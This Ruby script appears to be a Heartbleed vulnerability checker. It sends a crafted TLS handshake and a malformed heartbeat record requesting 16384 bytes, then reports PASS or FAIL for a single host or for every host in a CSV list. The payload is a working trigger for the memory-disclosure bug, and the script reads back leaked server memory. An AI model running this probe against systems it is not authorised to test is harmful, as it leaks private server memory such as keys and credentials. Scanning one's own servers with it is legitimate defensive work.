# encoding: BINARY
require 'socket'
require 'timeout'
require 'csv'

CLIENT_HELLO = -> {
  data = <<-EOS
16 03 01 00 38 01 00 00 34 03
01 23 18 50 c0 c7 9d 32 9f 90
63 de 32 12 14 1f 8c eb f1 a4
45 2b fd cc 12 87 ca db 32 b5
96 86 16 00 00 06 00 0a 00 2f
00 35 01 00 00 05 00 0f 00 01
01
  EOS
  [data.split(/\s/).join("")].pack('H*')
}.call

PAYLOAD = "\x18\x03\x01\x00\x03\x01\x40\x00" #  0x4000 = 16384 = 2^14, max value to be returned

SERVER_HELLO_DONE = "\x0e\x00\x00\x00"

module ContentType
  ALERT = "\x15"
  HEARTBEAT = "\x18"
end

class TLSRecord

  attr_reader :type, :version, :value

  def initialize(type, version, value)
    @type = type
    @version = version
    @value = value
  end

end

class Heartbeat

  def read_record(sock)
    Timeout.timeout(3) do
      type = sock.read(1)
      version = sock.read(2)
      length = sock.read(2).unpack('n')[0]
      value = length > 0 ? sock.read(length) : nil
      TLSRecord.new(type, version, value)
    end
  rescue NoMethodError => e
    nil
  rescue Errno::ECONNRESET
    TLSRecord.new("Connection reset", 0, 0)
  end

  def read_until_server_hello_done(sock)
    loop do
      record = read_record(sock)
      break if record.value == SERVER_HELLO_DONE
    end
  rescue NoMethodError => e
    nil
  end

  def go server, port=nil
    raise "Usage: ruby heartbeat.rb <server>" unless server

    sock = begin
             Timeout.timeout(3) { TCPSocket.open(server, port) }
           rescue Timeout::Error
             return "#{server}\tUNKNOWN\tCouldn't connect to #{server}:#{port}"
           rescue Errno::ECONNREFUSED
             return "#{server}\tUNKNOWN\tConnection refused"
           rescue SocketError
             return "#{server}\tUNKNOWN\tSite is down"
           end

    sock.write(CLIENT_HELLO)

    begin
      read_until_server_hello_done(sock)
    rescue Timeout::Error
      return "#{server}\tUNKNOWN\tCouldn't establish TLS connection."
    end

    begin
      sock.write(PAYLOAD)
    rescue Errno::EPIPE
      return "#{server}\tUNKNOWN\tBroken pipe while writing payload."
    end

    begin
      heartbeat = read_record(sock)

      if heartbeat
        case heartbeat.type
        when ContentType::HEARTBEAT
          return "#{server}\tFAIL\tServer vulnerable!" if heartbeat.value
          return "#{server}\tPASS\tServer sent a heartbeat response, but no data. This is OK."
        when ContentType::ALERT
          return "#{server}\tPASS\tServer sent an alert instead of a heartbeat response. This is OK."
        else
          return "#{server}\tUNKNOWN\tServer sent an unexpected ContentType: #{heartbeat.type.inspect}"
        end
      else
        return "#{server}\tUNKNOWN\tCouldn't read record."
      end

    rescue Timeout::Error
      return "#{server}\tPASS\tReceived a timeout when waiting for heartbeat response. This is OK."
    end

  end

end

class Reader

  def load_file file
    raise "No file!" unless file
    CSV.read file
  end

  def loop_contents contents, &block
    contents.each do |stuff|
      block.call stuff
    end
  end

  def go file, port
    h = Heartbeat.new
    loop_contents load_file(file) do |stuff|
      if stuff.is_a?(Array) and stuff.size > 1
        response = h.go stuff[1], port
        puts response if response =~ /FAIL/
      else
        puts "Not an array #{stuff}"
      end
    end
  end

end

server = ARGV[0]
port = ARGV[1] ? ARGV[1].to_i : 443

if server =~ /\.csv$/
  r = Reader.new
  r.go server, port
else
  h = Heartbeat.new
  puts h.go server, port
end

puts ""

